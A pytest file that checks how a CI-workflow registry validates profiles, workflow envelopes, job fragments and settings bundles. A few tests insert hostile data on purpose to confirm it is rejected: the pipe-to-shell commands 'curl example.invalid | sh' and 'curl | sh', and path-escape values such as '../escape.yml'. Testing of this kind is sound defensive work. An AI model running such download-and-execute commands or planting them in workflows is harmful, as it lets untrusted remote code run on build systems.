from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from aviato.core.composition import resolve_profile
from aviato.core.errors import CompositionError
from aviato.core.model import (
    Profile,
    ScaffoldBundle,
    SettingsBundle,
    TemplateModule,
    WorkflowEnvelopeModule,
    WorkflowsBundle,
)
from aviato.core.registry import Registry


def test_loads_profile(module_root: Path) -> None:
    profile = Registry(module_root).profile("child")
    assert isinstance(profile, Profile)
    assert profile.workflows == "child-wf"
    assert profile.identity == "aviato-profile/child/v1"


@pytest.mark.parametrize("identity", [None, "", "   "])
def test_profile_requires_non_empty_stable_identity(module_root: Path, identity: str | None) -> None:
    import yaml

    path = module_root / "child.yaml"
    doc = yaml.safe_load(path.read_text())
    if identity is None:
        doc.pop("identity", None)
    else:
        doc["identity"] = identity
    path.write_text(yaml.safe_dump(doc, sort_keys=False))

    with pytest.raises(CompositionError, match="identity"):
        Registry(module_root).profile("child")


def test_loads_workflows_bundle(module_root: Path) -> None:
    wb = Registry(module_root).workflows_bundle("child-wf")
    assert isinstance(wb, WorkflowsBundle)
    assert wb.extends == "base-wf"
    assert wb.add == ("c",)


def test_loads_scaffold_and_template(module_root: Path) -> None:
    reg = Registry(module_root)
    sb = reg.scaffold_bundle("child-sc")
    assert isinstance(sb, ScaffoldBundle)
    assert sb.templates == ("cfg",)
    tm = reg.template_module("cfg")
    assert isinstance(tm, TemplateModule)
    assert tm.output_path == "cfg.py"
    assert tm.comment == "#"


def test_loads_settings_bundle(module_root: Path) -> None:
    gb = Registry(module_root).settings_bundle("child-set")
    assert isinstance(gb, SettingsBundle)
    assert gb.settings["pr"]["required_reviews"] == 1


def test_unknown_name_is_hard_error(module_root: Path) -> None:
    with pytest.raises(CompositionError):
        Registry(module_root).profile("nope")


def test_registry_loads_data_only_workflow_envelopes_and_job_fragments(module_root: Path) -> None:
    import yaml

    (module_root / "workflow-envelopes.yaml").write_text(
        yaml.safe_dump(
            {
                "ci": {
                    "identity": "workflow/ci/v1",
                    "output_path": ".github/workflows/ci.yml",
                    "name": "CI",
                    "permissions": {},
                }
            }
        ),
        encoding="utf-8",
    )
    fragment = module_root / "workflow-fragments/verify.yml"
    fragment.parent.mkdir(parents=True)
    fragment.write_text("name: Verify\nruns-on: ubuntu-latest\nsteps:\n  - run: echo ok\n", encoding="utf-8")
    registry = Registry(module_root)
    assert registry.workflow_envelope("ci") == WorkflowEnvelopeModule(
        name="ci",
        identity="workflow/ci/v1",
        output_path=".github/workflows/ci.yml",
        display_name="CI",
        permissions=(),
    )
    assert registry.workflow_fragment("workflow-fragments/verify.yml")["steps"][0]["run"] == "echo ok"

    bad = yaml.safe_load((module_root / "workflow-envelopes.yaml").read_text())
    bad["ci"]["run"] = "curl example.invalid | sh"
    (module_root / "workflow-envelopes.yaml").write_text(yaml.safe_dump(bad), encoding="utf-8")
    with pytest.raises(CompositionError, match="unknown.*run|executable"):
        registry.workflow_envelope("ci")


def test_workflow_registry_rejects_unconfined_duplicate_missing_and_malformed_data(module_root: Path) -> None:
    import yaml

    manifest = {
        "ci": {
            "identity": "workflow/shared/v1",
            "output_path": ".github/workflows/ci.yml",
            "name": "CI",
        },
        "docs": {
            "identity": "workflow/shared/v1",
            "output_path": ".github/workflows/docs.yml",
            "name": "Docs",
        },
    }
    (module_root / "workflow-envelopes.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    registry = Registry(module_root)
    with pytest.raises(CompositionError, match="duplicate workflow envelope identity"):
        registry.workflow_envelope("ci")

    manifest.pop("docs")
    manifest["ci"]["identity"] = "workflow/ci/v1"
    manifest["ci"]["output_path"] = "/tmp/escape.yml"
    (module_root / "workflow-envelopes.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    with pytest.raises(CompositionError, match="repo-relative"):
        registry.workflow_envelope("ci")

    with pytest.raises(CompositionError, match="repo-relative"):
        registry.workflow_fragment("../escape.yml")
    with pytest.raises(CompositionError, match="missing workflow job fragment"):
        registry.workflow_fragment("workflow-fragments/missing.yml")

    fragment = module_root / "workflow-fragments/bad.yml"
    fragment.parent.mkdir(parents=True, exist_ok=True)
    fragment.write_text("steps: [\n", encoding="utf-8")
    with pytest.raises(CompositionError, match="not valid YAML"):
        registry.workflow_fragment("workflow-fragments/bad.yml")


def test_registry_rejects_raw_executable_fields_in_legacy_descriptors(module_root: Path) -> None:
    import yaml

    (module_root / "pipelines.yaml").write_text(
        yaml.safe_dump({"legacy": {"privileges": ["contents: read"], "runner": "linux", "run": "curl | sh"}}),
        encoding="utf-8",
    )
    with pytest.raises(CompositionError, match="unknown.*run|executable"):
        Registry(module_root).pipeline_module("legacy")


def test_registry_validates_all_global_identities_including_unselected_modules(tmp_path: Path) -> None:
    from .test_compiler import _registry

    registry = _registry(tmp_path)
    manifest = yaml.safe_load((registry.root / "pipelines.yaml").read_text())
    manifest["unselected"] = yaml.safe_load(yaml.safe_dump(manifest["baseline"]))
    manifest["unselected"]["identity"] = manifest["verify"]["identity"]
    manifest["unselected"]["jobs"]["security"]["identity"] = "job/unselected/v1"
    (registry.root / "pipelines.yaml").write_text(yaml.safe_dump(manifest, sort_keys=False), encoding="utf-8")
    with pytest.raises(CompositionError, match="duplicate pipeline identity"):
        registry.validate_workflow_graph_manifest()

    registry = _registry(tmp_path / "jobs")
    manifest = yaml.safe_load((registry.root / "pipelines.yaml").read_text())
    manifest["unselected"] = yaml.safe_load(yaml.safe_dump(manifest["baseline"]))
    manifest["unselected"]["identity"] = "pipeline/unselected/v1"
    manifest["unselected"]["jobs"]["other"] = manifest["unselected"]["jobs"].pop("security")
    manifest["unselected"]["jobs"]["other"]["identity"] = "job/verify/v1"
    (registry.root / "pipelines.yaml").write_text(yaml.safe_dump(manifest, sort_keys=False), encoding="utf-8")
    with pytest.raises(CompositionError, match="duplicate job identity"):
        registry.validate_workflow_graph_manifest()


@pytest.mark.parametrize(
    "fragment",
    [
        {"name": "Bad", "runs-on": "ubuntu-latest", "steps": []},
        {
            "name": "Bad",
            "uses": "owner/repo/.github/workflows/x.yml@sha",
            "runs-on": "ubuntu-latest",
            "steps": [{"run": "x"}],
        },
        {"name": "Bad", "steps": [{"run": "x"}]},
    ],
)
def test_registry_rejects_structurally_invalid_actions_job_fragments(
    tmp_path: Path, fragment: dict[str, object]
) -> None:
    from .test_compiler import _registry

    registry = _registry(tmp_path)
    (registry.root / "workflow-fragments/security.yml").write_text(
        yaml.safe_dump(fragment, sort_keys=False), encoding="utf-8"
    )
    with pytest.raises(CompositionError, match="Actions job|steps|uses|runs-on"):
        registry.validate_workflow_graph_manifest()


@pytest.mark.parametrize(
    "step",
    [
        {},
        {"run": ""},
        {"uses": "   "},
        {"run": 7},
        {"run": "echo ok", "uses": "owner/action@sha"},
    ],
)
def test_registry_requires_exactly_one_nonempty_step_selector(tmp_path: Path, step: dict[str, object]) -> None:
    from .test_compiler import _registry

    registry = _registry(tmp_path)
    fragment = yaml.safe_load((registry.root / "workflow-fragments/security.yml").read_text())
    fragment["steps"] = [step]
    (registry.root / "workflow-fragments/security.yml").write_text(
        yaml.safe_dump(fragment, sort_keys=False), encoding="utf-8"
    )

    with pytest.raises(CompositionError, match="step.*run.*uses|run.*uses"):
        registry.validate_workflow_graph_manifest()


def test_registry_rejects_non_mapping_pipeline_entries_and_non_string_trigger_keys(tmp_path: Path) -> None:
    from .test_compiler import _registry

    registry = _registry(tmp_path)
    manifest = yaml.safe_load((registry.root / "pipelines.yaml").read_text())
    manifest["not-a-pipeline"] = "invalid"
    (registry.root / "pipelines.yaml").write_text(yaml.safe_dump(manifest, sort_keys=False), encoding="utf-8")
    with pytest.raises(CompositionError, match="pipeline.*mapping"):
        registry.validate_workflow_graph_manifest()

    registry = _registry(tmp_path / "triggers")
    manifest = yaml.safe_load((registry.root / "pipelines.yaml").read_text())
    manifest["verify"]["triggers"] = {"push": {"branches": {1: {"add": ["main"]}}}}
    (registry.root / "pipelines.yaml").write_text(yaml.safe_dump(manifest, sort_keys=False), encoding="utf-8")
    with pytest.raises(CompositionError, match="trigger.*string key"):
        registry.validate_workflow_graph_manifest()


def test_resolve_profile_rejects_non_string_nested_settings_keys_as_composition_error(tmp_path: Path) -> None:
    from .test_compiler import _registry

    registry = _registry(tmp_path)
    settings_path = registry.root / "bundles/settings/demo-set.yaml"
    settings = yaml.safe_load(settings_path.read_text())
    settings["settings"]["security"] = {1: True}
    settings_path.write_text(yaml.safe_dump(settings, sort_keys=False), encoding="utf-8")

    with pytest.raises(CompositionError, match="mapping.*string key|string key"):
        resolve_profile(registry, "demo")
